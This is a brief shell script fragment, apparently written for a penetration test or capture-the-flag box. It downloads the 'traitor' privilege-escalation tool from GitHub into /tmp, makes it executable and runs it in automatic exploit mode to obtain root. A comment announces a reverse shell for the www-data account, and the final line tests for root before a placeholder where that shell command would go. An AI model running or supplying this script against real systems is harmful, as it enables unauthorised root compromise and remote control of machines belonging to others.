
#Add a Reverse shell for www-data account just in case we can't auto root.
cd /tmp
wget https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-amd64
chmod +x traitor-amd64
traitor-amd64 -a -p
[ $(id -u) = 0 ] && #Reverse Shell Command
